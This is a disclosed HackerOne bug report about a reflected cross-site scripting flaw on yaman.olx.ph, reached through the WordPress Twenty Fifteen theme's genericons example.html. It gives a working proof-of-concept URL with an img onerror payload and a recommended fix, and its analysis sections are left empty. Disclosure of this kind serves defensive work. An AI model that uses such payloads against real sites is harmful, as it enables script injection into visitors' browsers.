---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '151258'
original_report_id: '151258'
title: Reflected XSS at yaman.olx.ph
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-14T05:39:40.621Z'
disclosed_at: '2016-07-18T10:16:16.815Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS at yaman.olx.ph

## Metadata

- HackerOne Report ID: 151258
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-07-18T10:16:16.815Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Description of the Vulnerability 
====================
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites.


Vulnerable endpoint with Payload
--------------------------------
```
http://yaman.olx.ph/wp-content/themes/twentyfifteen/genericons/example.html#<img/src/onerror=alert(123)>
```

Recommended Fix
------------------------------------
Upgrade to the latest Wordpress Version or simply delete example.html from twentyfifteen theme.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
